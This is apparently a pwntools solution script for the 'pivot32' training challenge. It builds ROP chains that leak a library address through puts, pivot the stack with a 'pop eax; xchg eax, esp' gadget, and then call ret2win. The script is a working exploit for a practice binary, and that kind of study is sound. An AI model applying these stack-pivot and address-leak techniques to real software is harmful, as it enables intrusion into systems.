#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./pivot32
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./pivot32')
lib = ELF('./libpivot32.so')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
b *0x0804882e
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
# RUNPATH:  b'.'
pad= b"A"*cyclic_find(0x6161616c)
rop=ROP(exe)
rop.foothold_function()
rop.raw(exe.plt['puts'])
rop.raw(exe.symbols['main'])
rop.raw(exe.got['foothold_function'])

log.info(rop.dump())



io = start()
io.sendline(rop.chain())
io.recvuntil(b": ")
topivot=io.recvuntil(b"\n").decode().strip()
topivot=int(topivot,0)
log.info("Address to pivot: "+str(hex(topivot)))
pivot=ROP(exe)
pivot.raw(0x0804882c) # pop eax; ret
pivot.raw(topivot)
pivot.raw(0x0804882e) # xchg eax, esp; ret; to pivot
io.sendline(pad+pivot.chain())
print(io.recv(1028))
print(io.recvline())
print(io.recvline())
footholdFunc=u64(io.recv()[:4].strip().ljust(8, b'\x00')) #parse puts output 
log.success("foothold@libpivot32 is at: 0x%x" % footholdFunc)
lib.address=footholdFunc-lib.symbols['foothold_function']
log.success("libpivot32 is at: 0x%x" % lib.address)
log.success("ret2win@libpivot32 is at: 0x%x" % lib.symbols['ret2win'])
rop=ROP(lib)
rop.call(lib.symbols['ret2win'])
io.sendline(pad+rop.chain())

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()


